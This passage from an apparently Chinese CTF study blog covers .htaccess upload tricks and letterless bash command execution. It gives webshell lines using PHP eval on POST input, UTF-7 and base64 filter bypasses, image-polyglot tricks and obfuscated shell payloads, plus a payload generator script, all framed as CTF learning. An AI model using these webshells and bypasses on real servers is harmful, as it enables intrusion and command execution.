class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /var/www/html/shell.php</span><br><span class="line">php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-171432.png"></p><p>可以看到我们的路径成功写进去了，但存在<code>&lt;&gt;</code>被html编码转义问题。</p><p>这里我们需要用<strong>UTF-7编码</strong>来进行绕过，这里参考[XNUCA2019Qualifier]EasyPHP的解法：</p><p>先将带有<strong>UTF-7编码转换的🐎写入文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;+ADw?php eval(+ACQAXw-POST+AFs&#x27;a&#x27;+AF0)+ADs?+AD4-&quot;</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br></pre></td></tr></table></figure><blockquote><p>一般来说www-data在<code>/var/www/html</code>都没有写的权限的，所以写入<code>/tmp/</code>目录下</p></blockquote><p>然后利用UTF-7来解析写了🐎的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp&quot;   #指定目录找包含文件</span><br><span class="line">php_flag zend.multibyte 1       #启用 PHP 的多字节字符编码支持（如 UTF-8、UTF-7）。</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot; #指定 PHP 脚本文件的字符编码为 UTF-7。</span><br></pre></td></tr></table></figure><p>此时已经包含了上传的🐎文件，直接访问主文件连蚁剑或者RCE即可</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><h4 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="\反斜杠绕过"></a>\反斜杠绕过</h4><p>对于关键字的过滤我们可以利用<code>\</code>绕过，在.htaccess中<strong>支持<code>\</code>拼接上下两行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p\</span><br><span class="line">hp_value auto_prepend_fi\</span><br><span class="line">le ma.jpg</span><br></pre></td></tr></table></figure><h4 id="UTF-7编码绕过"><a href="#UTF-7编码绕过" class="headerlink" title="UTF-7编码绕过"></a>UTF-7编码绕过</h4><p>对于<code>&lt;?</code>等字符的检测可以用UTF-7编码来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">#+ADw-?php+ACA-+AEA-eval(+ACQ-+AF8-POST+AFs-&#x27;shell&#x27;+AF0-)+ADs-+ACA-?+AD4-</span><br></pre></td></tr></table></figure><h4 id="伪协议绕过"><a href="#伪协议绕过" class="headerlink" title="伪协议绕过"></a>伪协议绕过</h4><p>同样对于过滤<code>&lt;?php</code>等敏感内容也可以采用php:&#x2F;&#x2F;filter伪协议配合base64等其他编码绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.hatccess：</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_fi\</span><br><span class="line">le &quot;php://filter/convert.base64-decode/resource=ma.jpg&quot;</span><br><span class="line"></span><br><span class="line">ma.jpg:</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsgPz4=</span><br></pre></td></tr></table></figure><h3 id="脏字符绕过"><a href="#脏字符绕过" class="headerlink" title="脏字符绕过"></a>脏字符绕过</h3><p>参考：[<a href="https://buuoj.cn/challenges#[XNUCA2019Qualifier]EasyPHP">XNUCA2019Qualifier]EasyPHP</a></p><p>如一些题中会在我们写入的文件内容中添加一些脏字符如<code>\nJust one chance</code>使我们的文件失效</p><p>这时我们可以通过<strong>添加<code>#\</code>的方式</strong>来绕过，<code>\</code>将后面的斜杠进行<strong>转义成普通字符，再通过<code>#</code>注释掉后面的内容即可</strong></p><h3 id="回溯绕过preg-match"><a href="#回溯绕过preg-match" class="headerlink" title="回溯绕过preg_match"></a>回溯绕过preg_match</h3><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-180913.png"></p><p>由于PHP 的配置选项 pcre.backtrack_limit 给 pcre  设定了一个回溯次数上限，默认为1000000，如果<strong>回溯次数超过这个数字，preg_match 会返回false而不是0</strong>，这时我们设置回<strong>溯次数上限为0</strong>从而直接返回false来绕过preg_match等函数正则匹配的检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><h3 id="绕过上传图片限制"><a href="#绕过上传图片限制" class="headerlink" title="绕过上传图片限制"></a>绕过上传图片限制</h3><p>有时在上传图片时会遇到<code>getimagesize()</code>等函数对上传的图片进行尺寸限制，<strong>只允许上传指定大小尺寸的图片</strong>，并且会使用<code>exif_imagetype()</code>函数<strong>读取第一个字节并检查其签名</strong>。这时如果.htaccess没被过滤的话，我们可以修改.htaccess内容来绕过限制。</p><p>所以我们需要找一个能满足image要求又能让.htaccess有效的.htaccess&#x2F;image多语意文件。而**.htaccess中<code>#</code>和以空字节<code>\x00</code>开头的行都能起到注释的作用<strong>，即</strong>我们要找到一个签名开头带有<code>#</code>符号或<code>\x00</code>的文件格式**</p><p>我们可以看下<code>exif_imagetype()</code>支持的图像类型：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20250323195915.png"></p><p>WBMP（<strong>Wireless Bitmap）是一种 移动计算机 设备使用的标准 图像格式</strong>，WBMP文件开头是”Header” 头部。Header的第一个字节表示图片类型，目前<strong>只有0</strong>，即非压缩的黑白位图。<strong>第二个字节固定为0，第三个字节开始，分别是图像的宽度和高度</strong>，即：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-202800.png"></p><p>那么我们可以利用<code>\x00</code>来定义尺寸绕过并且不会对让.htaccess失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x85\x85    #后面\x85是尺寸，可修改</span><br><span class="line">AddType application/x-httpd-php 1.jpg</span><br></pre></td></tr></table></figure><p>XBM<strong>（X BitMap）是一种图像文件格式，用于X Window系统的图形界面，存储光标、图标等简单图像。</strong>而XBM文件主要<strong>使用 <code>#define</code> 定义宽、高和像素数组</strong>，因此我们可以利用XBM图像格式绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 16</span><br><span class="line">#define height 16</span><br><span class="line">AddType application/x-httpd-php 1.jpg</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://eastjun.top/posts/htaccess_use/">htaccess利用总结</a></p><p><a href="https://www.jiwo.org/ken/detail.php?id=3074">文件上传之.htaccess的一些技巧</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">[CTF].htaccess的使用技巧总结</a></p><p><a href="https://www.anquanke.com/post/id/241147#h3-22">与 .htaccess 相关的奇淫技巧</a></p><p><a href="https://xz.aliyun.com/news/7862?u_atoken=6668ff43a44a2318428095bc415d6570&u_asig=0a47314717427115150877000e003c&time__1311=n4+xRDnDgDuDBi7G8D0DBMbDyGQ89WpwhhPhD">Apache的.htaccess利用技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> .htaccess </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell变量执行RCE</title>
      <link href="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/"/>
      <url>/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>shell变量实现RCE这种思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p><p><strong>而处理这种类型的CTF，探姬师傅有个项目是可以一把梭的：<a href="https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file">https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</a></strong></p><p><strong>bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></strong></p><h3 id="shell脚本-的用法"><a href="#shell脚本-的用法" class="headerlink" title="shell脚本$的用法"></a>shell脚本$的用法</h3><p>首先先了解下linux shell脚本中$的用法</p><table><thead><tr><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>$0</td><td>脚本本身的名字</td></tr><tr><td>$1</td><td>脚本后所输入的第一串字符</td></tr><tr><td>$2</td><td>传递给该shell脚本的第二个参数</td></tr><tr><td>$*</td><td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td></tr><tr><td>$@</td><td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td></tr><tr><td>$_</td><td>表示上一个命令的最后一个参数</td></tr><tr><td>$#</td><td>#脚本后所输入的字符串个数</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>表示最后执行的后台命令的PID</td></tr><tr><td>$?</td><td>显示最后命令的退出状态，0表示没有错误，其他表示由错误</td></tr></tbody></table><h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>打CTF时，在过滤了字母的情况下我们可以采用八进制的形式绕过，即使用**<code>$&#39;xxx&#39;</code>（xxx为字符的八进制）的形式来执行命令<strong>，如</strong><code>$&#39;\154\163&#39;</code>表示<code>ls</code>**</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-210609.png"></p><p>但这有个缺陷，即**<code>$&#39;&#39;</code>中命令是不能接参数的，因为整个字符串被<code>$&#39;&#39;</code>包裹时，它会被当作一个整体字符串来处理，而linux没有<code>ls /</code>的单一命令，所以会报错**</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-210926.png"></p><p>那么应该怎么构造呢？</p><p>这里有两个思路，一是<strong>利用重定向<code>&lt;</code>将<code>/flag</code>内容传递给<code>cat</code>执行，再输出他们执行的结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-211504.png"></p><p>但有个缺陷就是需要知道flag文件名。所以需要另一种方法，<strong>即<code>bash&lt;&lt;&lt;&#123;......&#125;</code>会将大括号里的内容交给bash解析，参数用<code>,</code>隔开，如<code>bash&lt;&lt;&lt;&#123;cat,/f*&#125;</code>、<code>bash&lt;&lt;&lt;&#123;ls,/&#125;</code><strong>，</strong>而bash可以用<code>$0</code>表示</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\154\163&#x27;</span>,$<span class="string">&#x27;\057&#x27;</span>&#125;</span>  </span><br><span class="line">//bash&lt;&lt;&lt;&#123;ls,/&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\143\141\164&#x27;</span>,$<span class="string">&#x27;\057\146\052&#x27;</span>&#125;  //bash&lt;&lt;&lt;&#123;<span class="built_in">cat</span>,/f*&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213119.png"></p><p><strong>如果没有参数则不用大括号，不然会报错</strong></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213256.png"></p><p><strong>当然没有大括号也是能执行命令的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-222627.png"></p><p>通过上面的例子我们发现我们可以在数字可用的情况下进行命令执行</p><p>除此之外，在<strong>linux中<code>$(())</code>用于算术运算，即括号内的内容为进行运算的部分，默认情况下<code>$(())</code>为0</strong></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213735.png"></p><p>这样不就能随便构造数字了嘛，再结合**<code>$&#39;&#39;</code>**来执行RCE，可以发现这样有些多此一举，但如果只能使用1或0来构造命令时它的用处就大了。</p><p>这里还有个知识点，即<strong>bash里面可以使用<code>[bash#]n</code>的方式表示数字，即<code>2#100</code>表示2进制下的100，换成10进制即4</strong></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-214745.png"></p><p>现在知识点铺垫完了，直接开整。现在我们字母或数字只有0，1可用来进行命令执行，这时可用位移运算<code>1&lt;&lt;1</code>来代替2，payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100011))\&#x27;</span>  </span><br><span class="line">//ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001111))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100100))\&#x27;,$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#111001))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010011))\&#x27;&#125;</span></span><br><span class="line">//bash&lt;&lt;&lt;&#123;cat,/flag&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-221018.png"></p><p>但似乎不能用f*匹配了，但<code>ls /</code>都能执行，还怕不知道文件名嘛</p><p>但有一点需要注意的是，bash在执行命令前，会对命令进行一系列扩展（expansions），这些扩展包括花括号扩展（brace expansion）、波浪号扩展（tilde expansion）、<strong>参数和变量扩展</strong>（parameter and variable expansion）、<strong>算术扩展（arithmetic expansion）、命令替换（command substitution）</strong>、单词分割（word splitting）和文件名扩展（filename expansion）等，最重要的是这些扩展的顺序是固定的，而且是从左到右进行的。</p><p>而我们的八进制转义也就是$’\xxx\xxx’依赖于<strong>参数和变量扩展</strong>，转义后的结果是个<strong>字符串</strong>，即使用过一次bash了，由于我们本地就是bash环境，会默认解析，即输入**<code>$&#39;\154\163&#39;</code><strong>会解析执行，而我们带参数的命令还需执行</strong>单词分割扩展**，即<code>$&#39;\143\141\164\40\57\146\154\141\147&#39;</code>时本地bash已经解析为了<code>cat /flag</code>字符串，但无法进行单词分隔扩展，所以会把命令当成一个整体，所以执行后会显示<code>bash: cat /flag: 没有那个文件或目录</code>。所以一般情况下还需要一个bash，即<code>bash&lt;&lt;&lt;$&#39;\143\141\164\40\57\146\154\141\147&#39;</code></p><p>而我们有些时候还需要进行的操作是<strong>算术扩展</strong>和<strong>命令替换</strong>，所以一般除了本地解析外，还需要一个bash，即**<code>bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;......</code>**，后面会讲到</p><p>具体原理文章参考：<a href="https://www.freebuf.com/articles/system/361101.html">https://www.freebuf.com/articles/system/361101.html</a></p><p>可用看到这种构造方式不够极限，里面不仅出现了0还出现了1，<strong>下面我们开始真正的无字母数字构造</strong></p><h3 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用$#构造</h3><p>在shell中，<code>$#</code>表示脚本后所输入的字符串个数：</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-221718.png"></p><blockquote><p><strong>$# -参数数量-单独使用结果为0</strong></p><p><strong>$ -计数变量（#）长度，这里的结果为1</strong></p></blockquote><p>这里0和1都有了，那构造命令不就只用换一下嘛</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$#</span>&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span> </span><br><span class="line">bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-223822.png"></p><p>测试发现不是这样的，虽然**$0表示bash，$<code>，在linux中</code>${!}&#96;表示间接引用**，举个例子:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh:</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=<span class="string">&quot;11111&quot;</span></span><br><span class="line">var2=<span class="string">&quot;var1&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!var2&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-225012.png"></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-035026.png"></p><blockquote><p><strong>可认为${!a}&#x3D;$$a</strong></p></blockquote><p>因此我们只用找到一个值为0的变量来替换即可，而<code>$#</code>值恰好为0,所以**<code>$&#123;!#&#125;</code>就能使用**</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-225822.png"></p><p>那么bash有了，<strong>其余的0和1换成<code>$#</code>和<code>$</code>即可</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-230306.png"></p><p>由于这里只需要进行<strong>参数和变量扩展</strong>和<strong>单词分割</strong>，所以除本地解析外一个bash就够了，两个也不影响：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;<span class="variable">$&#123;!#&#125;</span>\&lt;\&lt;\&lt;\$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意转义，主要使用这种形式</p></blockquote><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-235408.png"></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-230730.png"></p><p>但在有些题中有可能**<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来**，可以换另一种形式，即变量拼接</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-231515.png"></p><p>加了$__作为过渡，减少了解析过程</p><p>payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$#;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">//bash&lt;&lt;&lt;bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-231702.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用$?构造"></a>利用$?构造</h3><p>其实构造时我们也发现了，只需要找到一个值为0的变量得到bash就能继续构造。而<strong>linux中<code>$?</code>表示最后命令的退出状况，0表示没有错误，其他表示有错</strong>，那么思路就来了，只要payload不报错值不就为0嘛</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-232254.png"></p><p>0有了，那1怎么来呢？这里就需要字符串拼接了，<code>__=$?</code>,那<code>++__</code>不就为1了嘛，令<code>___=$((++__))</code>，那2不就也有了嘛，把之前的payload替换一下就好了:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__=$?&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$?&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br><span class="line"></span><br><span class="line">//_____=0;____=2;__=1,bash&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\154\141\147&#x27;,cat /flag</span><br></pre></td></tr></table></figure><p>这里就要注意了，上面那个是执行不了的，因为这里除了<strong>参数和变量扩展</strong>和<strong>单词分割</strong>外，还存在<strong>算术扩展</strong>，所以一个bash是解析不完的，只能解析<strong>参数和变量扩展</strong>和<strong>算术扩展</strong>，而<strong>单词分割</strong>没有bash解析，最后报错<code>bash: cat /flag: 没有那个文件或目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 